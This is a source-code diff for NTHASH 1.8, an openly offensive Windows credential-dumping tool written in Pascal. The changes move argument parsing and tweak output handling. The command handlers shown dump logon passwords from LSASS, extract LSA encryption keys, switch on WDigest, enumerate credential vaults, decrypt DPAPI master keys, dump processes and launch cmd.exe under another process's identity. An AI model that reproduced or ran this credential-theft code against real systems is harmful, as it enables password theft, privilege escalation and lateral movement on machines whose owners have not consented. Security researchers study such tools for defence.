@@ -256,7 +256,8 @@ end;
 
 var
   lsass_pid:dword=0;
-  consoletype,p,ret,dw,dw1,dw2:dword;
+  _long:longint;
+  p,ret,dw,dw1,dw2:dword;
   consolecp:uint;
   rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,domain,input,mode,key:string;
   inputw:widestring;
@@ -913,14 +914,14 @@ end;
 
 
 begin
-  consoletype:=GetFileType(GetStdHandle(STD_OUTPUT_HANDLE));
+  console_output_type:=GetFileType(GetStdHandle(STD_OUTPUT_HANDLE));
   consolecp:=GetConsoleCP ; //in case you want alter/restore the console codepage
   //
   //FILE_TYPE_DISK : to a file
   //FILE_TYPE_CHAR : to output console
   //FILE_TYPE_PIPE : to a pipe
   //
-  if consoletype<>FILE_TYPE_PIPE then
+  if console_output_type<>FILE_TYPE_PIPE then
     log('NTHASH 1.8 '+{$ifdef CPU64}'x64'{$endif cpu64}{$ifdef CPU32}'x32'{$endif cpu32}+' by erwan2212@gmail.com',1);
   winver:=GetWindowsVer;
   osarch:=getenv('PROCESSOR_ARCHITECTURE');
@@ -1046,8 +1047,8 @@ begin
      log('Offline=true',1);
      if (not FileExists ('sam.sav')) or (not FileExists ('system.sav')) then
         begin
-        log('sam.sav and/or system.sav missing',1);
-        goto fin;
+        log('sam.sav and/or system.sav and/or security.sav missing',1);
+        //goto fin;
         end;
      end;
   //any input?
@@ -1062,7 +1063,8 @@ begin
         input:=input+strpas(@input_[0]);
         ZeroMemory(@input_[0],256);
         end;
-     //input:=StringReplace (input,chr(13)+chr(10),'',[]);
+     //in some situations, the input ends with CRLF in which case we will remove it
+     if (input[length(input)-1]=#13) and (input[length(input)]=#10) then delete(input,length(input)-1,2) ;
      //writeln('.'+input+'.');
      log('input length:'+inttostr(length(input)));
      //exit;
@@ -1083,79 +1085,6 @@ begin
   //writeln(sizeof(_LSA_UNICODE_STRING));
   //exit;
   //
-  p:=pos('/enumcred2',cmdline);
-  if p>0 then
-   begin
-   //uvaults.VaultInit ;
-   uvaults.patch (lsass_pid ); //calling enumvault seems to bring back an encrypted blob
-   goto fin;
-   end;
-    p:=pos('/enumvault',cmdline);
-  if p>0 then
-     begin
-     uvaults.VaultInit ;
-     uvaults.Vaultenum ;
-     goto fin;
-     end;
-  p:=pos('/enumcred',cmdline);
-  if p>0 then
-     begin
-       try
-       if CredEnum=true then log('enumcred OK',1) else log('enumcred NOT OK',1);
-       except
-       on e:exception do log(e.message);
-       end;
-       goto fin;
-     end;
-  p:=pos('/getlsakeys',cmdline);
-  if p>0 then
-     begin
-     if findlsakeys (lsass_pid,deskey,aeskey,iv ) then
-        begin
-        log('IV:'+ByteToHexaString (iv),1);
-        log('DESKey:'+ByteToHexaString (deskey),1);
-        log('AESKey:'+ByteToHexaString (aeskey),1);
-        end;
-     goto fin;
-     end;
-  p:=pos('/dpapimk',cmdline);
-  if p>0 then
-     begin
-     findlsakeys (lsass_pid,deskey,aeskey,iv );
-     dpapi (lsass_pid );
-     goto fin;
-     end;
-  p:=pos('/logonpasswords',cmdline);
-  if p>0 then
-     begin
-     findlsakeys (lsass_pid,deskey,aeskey,iv );
-     //logonpasswords (lsass_pid,0,'',@callback_LogonPasswords );
-     logonpasswords (lsass_pid );
-     goto fin;
-     end;
-  p:=pos('/wdigeston',cmdline);
-  if p>0 then
-     begin
-     //symmode :=true;;
-     if wdigest_on  (lsass_pid )
-       then log('wdigest_on OK',1)
-       else log('wdigest_on NOT OK',1);
-     exit;
-     end;
-  p:=pos('/wdigest',cmdline);
-  if p>0 then
-     begin
-     if findlsakeys (lsass_pid,deskey,aeskey,iv )=true
-        then wdigest (lsass_pid)
-        else log('findlsakeys failed',1);
-     goto fin;
-     end;
-  p:=pos('/enumpriv',cmdline);
-  if p>0 then
-     begin
-     if enumprivileges=false then writeln('enumprivileges NOT OK');
-     goto fin;
-     end;
   p:=pos('/server:',cmdline);
   if p>0 then
        begin
@@ -1234,13 +1163,121 @@ begin
        key:=stringreplace(key,'/key:','',[rfReplaceAll, rfIgnoreCase]);
        delete(key,pos(' ',key),255);
        end;
-  //************* ENCODE/DECODE ***********************************************
+  p:=pos('/oldhash:',cmdline);
+  if p>0 then
+       begin
+       oldhash:=copy(cmdline,p,255);
+       oldhash:=stringreplace(oldhash,'/oldhash:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(oldhash,pos(' ',oldhash),255);
+       //log(oldhash);
+       end;
+  p:=pos('/newhash:',cmdline);
+  if p>0 then
+       begin
+       newhash:=copy(cmdline,p,255);
+       newhash:=stringreplace(newhash,'/newhash:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(newhash,pos(' ',newhash),255);
+       //log(newhash);
+       end;
+  p:=pos('/oldpwd:',cmdline);
+  if p>0 then
+       begin
+       oldpwd:=copy(cmdline,p,255);
+       oldpwd:=stringreplace(oldpwd,'/oldpwd:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(oldpwd,pos(' ',oldpwd),255);
+       //log(oldpwd);
+       end;
+  p:=pos('/newpwd:',cmdline);
+  if p>0 then
+       begin
+       newpwd:=copy(cmdline,p,255);
+       newpwd:=stringreplace(newpwd,'/newpwd:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(newpwd,pos(' ',newpwd),255);
+       //log(newpwd);
+       end;
+//***************************************************************************
+//*********************** end of input parameters ***************************
+//***************************************************************************
+p:=pos('/enumcred2',cmdline);
+if p>0 then
+ begin
+ //uvaults.VaultInit ;
+ uvaults.patch (lsass_pid ); //calling enumvault seems to bring back an encrypted blob
+ goto fin;
+ end;
+  p:=pos('/enumvault',cmdline);
+if p>0 then
+   begin
+   uvaults.VaultInit ;
+   uvaults.Vaultenum ;
+   goto fin;
+   end;
+p:=pos('/enumcred',cmdline);
+if p>0 then
+   begin
+     try
+     if CredEnum=true then log('enumcred OK',1) else log('enumcred NOT OK',1);
+     except
+     on e:exception do log(e.message);
+     end;
+     goto fin;
+   end;
+p:=pos('/getlsakeys',cmdline);
+if p>0 then
+   begin
+   if findlsakeys (lsass_pid,deskey,aeskey,iv ) then
+      begin
+      log('IV:'+ByteToHexaString (iv),1);
+      log('DESKey:'+ByteToHexaString (deskey),1);
+      log('AESKey:'+ByteToHexaString (aeskey),1);
+      end;
+   goto fin;
+   end;
+p:=pos('/dpapimk',cmdline);
+if p>0 then
+   begin
+   findlsakeys (lsass_pid,deskey,aeskey,iv );
+   dpapi (lsass_pid );
+   goto fin;
+   end;
+p:=pos('/logonpasswords',cmdline);
+if p>0 then
+   begin
+   findlsakeys (lsass_pid,deskey,aeskey,iv );
+   //logonpasswords (lsass_pid,0,'',@callback_LogonPasswords );
+   logonpasswords (lsass_pid );
+   goto fin;
+   end;
+p:=pos('/wdigeston',cmdline);
+if p>0 then
+   begin
+   //symmode :=true;;
+   if wdigest_on  (lsass_pid )
+     then log('wdigest_on OK',1)
+     else log('wdigest_on NOT OK',1);
+   exit;
+   end;
+p:=pos('/wdigest',cmdline);
+if p>0 then
+   begin
+   if findlsakeys (lsass_pid,deskey,aeskey,iv )=true
+      then wdigest (lsass_pid)
+      else log('findlsakeys failed',1);
+   goto fin;
+   end;
+p:=pos('/enumpriv',cmdline);
+if p>0 then
+   begin
+   if enumprivileges=false then writeln('enumprivileges NOT OK');
+   goto fin;
+   end;
+//************* ENCODE/DECODE ***********************************************
   //FiletoHexaString ('encrypted.blob');
   p:=pos('/filetohexa',cmdline);
     if p>0 then
        begin
        if binary='' then exit;
-       if consoletype<>FILE_TYPE_PIPE then log('filetohexa',1);
+       if console_output_type<>FILE_TYPE_PIPE then log('filetohexa',1);
        if not FiletoHexaString(binary)
           then log('not ok',1);
        goto fin;
@@ -1249,7 +1286,7 @@ begin
     if p>0 then
        begin
        if input='' then exit;
-       if consoletype<>FILE_TYPE_PIPE then log('hexatofile',1);
+       if console_output_type<>FILE_TYPE_PIPE then log('hexatofile',1);
        if HexaStringToFile ('data.blob',HexaStringToByte2(input))
           then log('data.blob written',1) else log('not ok',1);
        goto fin;
@@ -1259,7 +1296,7 @@ begin
      begin
      if input='' then exit;
      //log('BytetoString:'+BytetoAnsiString (HexaStringToByte (input)),1);
-     if consoletype<>FILE_TYPE_PIPE then log('hexatostring',1);
+     if console_output_type<>FILE_TYPE_PIPE then log('hexatostring',1);
      log(BytetoAnsiString (HexaStringToByte (input)),1);
      goto fin;
      end;
@@ -1268,7 +1305,7 @@ begin
      begin
      if input='' then exit;
      //log('StringtoByte:'+ ByteToHexaString ( AnsiStringtoByte(input)),1);
-     if consoletype<>FILE_TYPE_PIPE then log('stringtohexa',1);
+     if console_output_type<>FILE_TYPE_PIPE then log('stringtohexa',1);
      log(ByteToHexaString ( AnsiStringtoByte(input)),1);
      goto fin;
      end;
@@ -1277,7 +1314,7 @@ begin
      begin
      if input='' then exit;
      //log('widestringtobyte:'+ ByteToHexaString ( AnsiStringtoByte(input,true)),1);
-     if consoletype<>FILE_TYPE_PIPE then log('widestringtohexa',1);
+     if console_output_type<>FILE_TYPE_PIPE then log('widestringtohexa',1);
      log(ByteToHexaString ( AnsiStringtoByte(input,true)),1);
      goto fin;
      end;
@@ -1287,7 +1324,7 @@ begin
      if input='' then exit;
      input:=StringReplace (input,'%2f','/',[rfReplaceAll,rfIgnoreCase]);
      //writeln('input:'+input);
-     if consoletype<>FILE_TYPE_PIPE then log('base64encodew',1);
+     if console_output_type<>FILE_TYPE_PIPE then log('base64encodew',1);
      log(EncodeStringBase64w (widestring(input)) ,1);
      goto fin;
      end;
@@ -1297,7 +1334,7 @@ begin
      if input='' then exit;
      input:=StringReplace (input,'%2f','/',[rfReplaceAll,rfIgnoreCase]);
      //writeln('input:'+input);
-     if consoletype<>FILE_TYPE_PIPE then log('base64encode',1);
+     if console_output_type<>FILE_TYPE_PIPE then log('base64encode',1);
      log(base64.EncodeStringBase64 ((input)) ,1);
      goto fin;
      end;
@@ -1315,7 +1352,7 @@ begin
      begin
      if input='' then exit;
      //log(inttostr(length(input)));
-     if consoletype<>FILE_TYPE_PIPE then log('base64decodehexa',1);
+     if console_output_type<>FILE_TYPE_PIPE then log('base64decodehexa',1);
      log(ByteToHexaString (AnsiStringtoByte (base64.DecodeStringBase64 (input))) ,1);
      goto fin;
      end;
@@ -1323,7 +1360,7 @@ begin
   if p>0 then
      begin
      if input='' then exit;
-     if consoletype<>FILE_TYPE_PIPE then log('base64decode',1);
+     if console_output_type<>FILE_TYPE_PIPE then log('base64decode',1);
      //SetConsoleOutputCP(437  );
      log(base64.DecodeStringBase64 (input) ,1);
      //SetConsoleOutputCP(consolecp);
@@ -1450,12 +1487,15 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   p:=pos('/enumproc',cmdline); //can be done with taskkill
     if p>0 then
        begin
-       upsapi._EnumProc ;
+       //writeln('.'+trim(input)+'.');
+       dw:=upsapi._EnumProc(trim(input));
+       if dw<>0 then log(inttostr(dw),1);
        goto fin;
        end;
     p:=pos('/enummod',cmdline);  ////can be done with taskkill
     if p>0 then
        begin
+       if TryStrToInt (input,_long ) then pid:=input;
        if pid='' then exit;
        _EnumMod(strtoint(pid),'');
        goto fin;
@@ -1463,6 +1503,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   p:=pos('/dumpproc',cmdline);
   if p>0 then
      begin
+     if TryStrToInt (input,_long ) then pid:=input;
      if pid='' then exit;
      if dumpprocess (strtoint(pid)) then log('OK',1) else log('NOT OK',1);
      goto fin;
@@ -1470,6 +1511,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   p:=pos('/killproc',cmdline);  ////can be done with taskkill
   if p>0 then
      begin
+     if TryStrToInt (input,_long ) then pid:=input;
      if pid='' then exit;
      if upsapi._killproc(strtoint(pid)) then log('OK',1) else log('NOT OK',1);
      goto fin;
@@ -1482,13 +1524,13 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
      goto fin;
      end;
   p:=pos('/getntlmhash',cmdline);
-      if p>0 then
-           begin
-           if input='' then exit;
-           log('getntlmhash',1);
-           log (GenerateNTLMHash (input),1);
-           goto fin;
-           end;
+  if p>0 then
+       begin
+       if input='' then exit;
+       if console_output_type<>FILE_TYPE_PIPE then log('getntlmhash',1);
+       log (GenerateNTLMHash (input),1);
+       goto fin;
+       end;
   p:=pos('/getusers',cmdline);
   if p>0 then
        begin
@@ -1508,38 +1550,6 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
        ConvertSidToStringSidA (mypsid,mystringsid);
        log(mystringsid,1);
        goto fin;
-       end;
-  p:=pos('/oldhash:',cmdline);
-  if p>0 then
-       begin
-       oldhash:=copy(cmdline,p,255);
-       oldhash:=stringreplace(oldhash,'/oldhash:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(oldhash,pos(' ',oldhash),255);
-       //log(oldhash);
-       end;
-  p:=pos('/newhash:',cmdline);
-  if p>0 then
-       begin
-       newhash:=copy(cmdline,p,255);
-       newhash:=stringreplace(newhash,'/newhash:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(newhash,pos(' ',newhash),255);
-       //log(newhash);
-       end;
-  p:=pos('/oldpwd:',cmdline);
-  if p>0 then
-       begin
-       oldpwd:=copy(cmdline,p,255);
-       oldpwd:=stringreplace(oldpwd,'/oldpwd:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(oldpwd,pos(' ',oldpwd),255);
-       //log(oldpwd);
-       end;
-  p:=pos('/newpwd:',cmdline);
-  if p>0 then
-       begin
-       newpwd:=copy(cmdline,p,255);
-       newpwd:=stringreplace(newpwd,'/newpwd:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(newpwd,pos(' ',newpwd),255);
-       //log(newpwd);
        end;
   p:=pos('/setntlm',cmdline);
   if p>0 then
@@ -1575,6 +1585,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   if p>0 then
      begin
      if copy(winver,1,3)='5.1' then exit;
+     if TryStrToInt (input,_long ) then pid:=input;
      if pid='' then exit;
      if binary='' then binary:=sysdir+'\cmd.Exe';
      if createprocessaspid   (binary,pid)
@@ -1598,6 +1609,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   if p>0 then
      begin
      if copy(winver,1,3)='5.1' then exit;
+     if TryStrToInt (input,_long ) then pid:=input;
      if pid='' then exit;
      if binary='' then binary:=sysdir+'\cmd.Exe';
      if CreateProcessOnParentProcess(strtoint(pid),binary)=true
@@ -1689,9 +1701,14 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
         begin
         //CopyMemory( @output_ [0],@output_ [4],length(output_)-4);
         //log(ByteToHexaString (output_),1);
-        log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
-        log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
-        log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
+        if mode='' then
+          begin
+          log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
+          log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
+          log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
+          end; //if mode='' then
+        if lowercase(mode)='machine' then log(ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
+        if lowercase(mode)='user' then log(ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
         end;
      goto fin;
      end;
@@ -1718,17 +1735,25 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
      if (input='') and (binary='') then exit;
      if binary <>'' then if CryptUnProtectData_(binary,output_)=false
          then log('CryptUnProtectData_ NOT OK',1)
-         else log('Decrypted:'+BytetoAnsiString (output_),1);
+         else
+         begin
+         if console_output_type<>FILE_TYPE_PIPE then log('CryptUnProtectData_',1);
+         log(BytetoAnsiString (output_),1);
+         end;
      if input <>'' then if CryptUnProtectData_(HexaStringToByte2 (input) ,output_)=false
          then log('CryptUnProtectData_ NOT OK',1)
-         else log('Decrypted:'+BytetoAnsiString (output_),1);
+         else
+         begin
+         if console_output_type<>FILE_TYPE_PIPE then log('CryptUnProtectData_',1);
+         log(BytetoAnsiString (output_),1);
+         end;
      end;
   p:=pos('/cryptprotectdata',cmdline);
   if p>0 then
      begin
      if input='' then exit;
      dw:=0;
-     if mode='MACHINE' then dw:=4; //CRYPTPROTECT_LOCAL_MACHINE
+     if lowercase(mode)='machine' then dw:=4; //CRYPTPROTECT_LOCAL_MACHINE
       if CryptProtectData_(AnsiStringtoByte (input) ,'encrypted.blob',dw)=false
          then log('CryptUnProtectData_ NOT OK',1)
          else log('CryptUnProtectData_ OK - written : encrypted.blob',1);
@@ -1736,7 +1761,9 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   p:=pos('/decodeblob',cmdline);
     if p>0 then
        begin
+       if (binary='') and FileExists ('encrypted.blob') then binary:='encrypted.blob';
        if binary='' then exit;
+       log('filename:'+extractfilename(binary),1);
        if input='' then
           if decodeblob (binary,nil)=false then log('not ok',1);
         if input<>'' then
@@ -1773,7 +1800,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
             if decodemk (binary,nil)=false then
             begin
             log('not ok',1);
-            exit;
+            goto fin;
             end;
 
          //
@@ -1782,11 +1809,11 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
            if decodemk (binary,@mk)=false then
               begin
               log('not ok',1);
-              exit;
+              goto fin;
               end;
            input_:=HexaStringToByte2(input);
            log('length(input_):'+inttostr(length(input_)));
-           log('**** Unprotecting MasterKey ****',1);
+           if console_output_type<>FILE_TYPE_PIPE then log('**** Unprotecting MasterKey ****',1);
              ptr_:=nil;
              if dpapi_unprotect_masterkey_with_shaDerivedkey(mk,@input_[0],length(input_),ptr_,dw)
                 then
@@ -1796,9 +1823,17 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
                  //SetLength(output_,dw);
                  //CopyMemory(@output_[0],ptr_,dw);
                  //log('KEY:'+ByteToHexaString (output_),1);
-                 log('KEY:'+ByteToHexaString (ptr_,dw),1);
-                 crypto_hash_ (CALG_SHA1,ptr_,dw,output_,crypto_hash_len(CALG_SHA1));
-                 log('SHA1:'+ByteToHexaString (output_),1);
+                 if console_output_type<>FILE_TYPE_PIPE then
+                    begin
+                    log('KEY:'+ByteToHexaString (ptr_,dw),1);
+                    crypto_hash_ (CALG_SHA1,ptr_,dw,output_,crypto_hash_len(CALG_SHA1));
+                    log('SHA1:'+ByteToHexaString (output_),1);
+                    end;
+                 if console_output_type=FILE_TYPE_PIPE then
+                    begin
+                    crypto_hash_ (CALG_SHA1,ptr_,dw,output_,crypto_hash_len(CALG_SHA1));
+                    log(ByteToHexaString (output_),1);
+                    end;
                  end
                 else log('dpapi_unprotect_masterkey_with_shaDerivedkey not ok',1);
            end; //if input<>'' then
